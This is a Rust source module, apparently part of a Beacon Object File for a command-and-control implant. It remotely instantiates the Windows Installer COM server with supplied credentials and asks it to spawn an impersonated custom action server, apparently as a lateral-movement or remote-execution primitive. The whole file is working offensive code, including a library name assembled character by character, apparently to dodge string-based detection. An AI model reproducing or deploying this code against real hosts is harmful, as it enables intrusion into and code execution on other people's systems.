#![allow(unsafe_op_in_unsafe_fn)]

use core::ffi::c_void;
use core::ptr::{null, null_mut};
use windows_sys::core::{GUID, HRESULT, PCSTR};
use windows_sys::Win32::Foundation::{FALSE, HMODULE};
use windows_sys::Win32::System::Com::{
    CoCreateInstanceEx, CoInitialize, CLSCTX_LOCAL_SERVER, CLSCTX_REMOTE_SERVER,
    COSERVERINFO, MULTI_QI,
};
use windows_sys::Win32::System::Environment::{FreeEnvironmentStringsW, GetEnvironmentStringsW};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};
use rustbof::{eprintln, println};

use crate::secure::{self, AuthBundle};
use crate::vtbl::{
    IClassFactory, IMsiConfigurationManager, IMsiCustomAction, IUnknown,
    CLSID_MsiServer, CLSID_MSIRemoteApi,
    IID_IClassFactory, IID_IMsiCustomAction, IID_IMsiRemoteAPI, IID_IMsiServer,
    ICAC64_IMPERSONATED,
};

const COOKIE: usize = 32;

type DllGetClassObjectFn = unsafe extern "system" fn(
    *const GUID, *const GUID, *mut *mut c_void,
) -> HRESULT;

pub unsafe fn open_server(
    b: &AuthBundle, host: Option<*const u16>,
) -> Result<*mut IUnknown, HRESULT> {
    let ctx = if host.is_some() { CLSCTX_REMOTE_SERVER } else { CLSCTX_LOCAL_SERVER };
    match host {
        Some(h) => println!("ctx=remote target=@{:p}", h),
        None    => println!("ctx=local"),
    }

    let hr = CoInitialize(null());
    if hr < 0 { eprintln!("com-init rc=0x{:08X}", hr as u32); }

    let hr = secure::init_com_security(b);
    if hr < 0 { eprintln!("sec-init rc=0x{:08X}", hr as u32); return Err(hr); }

    let mut server_info: COSERVERINFO = core::mem::zeroed();
    let p_server_info: *const COSERVERINFO = if let Some(h) = host {
        server_info.pwszName  = h as *mut u16;
        server_info.pAuthInfo = &b.auth_info as *const _ as *mut _;
        &server_info as *const COSERVERINFO
    } else { null() };

    let mut qi: MULTI_QI = core::mem::zeroed();
    qi.pIID = &IID_IMsiServer;

    match host {
        Some(h) => println!("stage1: instancing on @{:p}", h),
        None    => println!("stage1: instancing locally"),
    };
    let hr = CoCreateInstanceEx(&CLSID_MsiServer, null_mut(), ctx as u32, p_server_info, 1, &mut qi);
    if hr < 0 { eprintln!("stage1 rc=0x{:08X}", hr as u32); return Err(hr); }
    if qi.hr < 0 { eprintln!("qi.a rc=0x{:08X}", qi.hr as u32); return Err(qi.hr); }
    let srv = qi.pItf as *mut IUnknown;
    println!("stage1 ok @{:p}", srv);

    if host.is_some() {
        println!("applying blanket");
        let out = secure::apply_blanket(srv, b, &IID_IMsiServer);
        ((*(*srv).lpVtbl).Release)(srv);
        out
    } else {
        ((*(*srv).lpVtbl).AddRef)(srv);
        let out = srv;
        ((*(*srv).lpVtbl).Release)(srv);
        Ok(out)
    }
}

unsafe fn env_bytes(mut p: *const u16) -> u32 {
    if p.is_null() { return 0; }
    let start = p;
    loop { if *p == 0 && *p.add(1) == 0 { break; } p = p.add(1); }
    ((p.offset_from(start) as u32) + 2) * 2
}

unsafe fn factory_object(hmod: HMODULE, clsid: *const GUID, iid: *const GUID) -> *mut IUnknown {
    if hmod.is_null() { return null_mut(); }
    let proc = GetProcAddress(hmod, b"DllGetClassObject\0".as_ptr() as PCSTR);
    let Some(proc) = proc else { return null_mut(); };
    let get: DllGetClassObjectFn = core::mem::transmute(proc);
    let mut fac: *mut IClassFactory = null_mut();
    let hr = get(clsid, &IID_IClassFactory, &mut fac as *mut _ as *mut _);
    if hr < 0 || fac.is_null() { return null_mut(); }
    let mut obj: *mut IUnknown = null_mut();
    let hr = ((*(*fac).lpVtbl).CreateInstance)(fac, null_mut(), iid, &mut obj as *mut _ as *mut _);
    ((*(*fac).lpVtbl).base.Release)(fac as *mut IUnknown);
    if hr < 0 { return null_mut(); }
    obj
}

pub unsafe fn spawn_action(
    server: *mut IUnknown, b: &AuthBundle,
) -> Result<*mut IMsiCustomAction, HRESULT> {
    let msi_name: [u16; 8] = [
        b'm' as u16, b's' as u16, b'i' as u16, b'.' as u16,
        b'd' as u16, b'l' as u16, b'l' as u16, 0,
    ];
    let hmsi = LoadLibraryW(msi_name.as_ptr());
    if hmsi.is_null() { eprintln!("msi.dll load fail"); return Err(-1); }

    let rem = factory_object(hmsi, &CLSID_MSIRemoteApi, &IID_IMsiRemoteAPI);
    if rem.is_null() { eprintln!("remapi failed"); return Err(-1); }

    let env = GetEnvironmentStringsW();
    let env_sz = env_bytes(env as *const u16);
    let mut cookie = [0u8; COOKIE];
    let mut cookie_sz: i32 = COOKIE as i32;
    let mut action: *mut IMsiCustomAction = null_mut();
    let mut pid: u32 = 0;

    let cfg = server as *mut IMsiConfigurationManager;
    let hr = ((*(*cfg).lpVtbl).CreateCustomActionServer)(
        cfg, ICAC64_IMPERSONATED, 4, rem, env as *const u16, env_sz, 0,
        cookie.as_mut_ptr(), &mut cookie_sz, &mut action, &mut pid, FALSE,
    );
    FreeEnvironmentStringsW(env as *const u16);

    if action.is_null() {
        eprintln!("stage2 rc=0x{:08X}", hr as u32);
        ((*(*rem).lpVtbl).Release)(rem);
        return Err(hr);
    }

    let authed = match secure::apply_blanket(action as *mut IUnknown, b, &IID_IMsiCustomAction) {
        Ok(p) => p as *mut IMsiCustomAction,
        Err(e) => {
            eprintln!("qi.b failed rc=0x{:08X}", e as u32);
            ((*(*action).lpVtbl).base.Release)(action as *mut IUnknown);
            ((*(*rem).lpVtbl).Release)(rem);
            return Err(e);
        }
    };
    ((*(*action).lpVtbl).base.Release)(action as *mut IUnknown);
    ((*(*rem).lpVtbl).Release)(rem);
    Ok(authed)
}
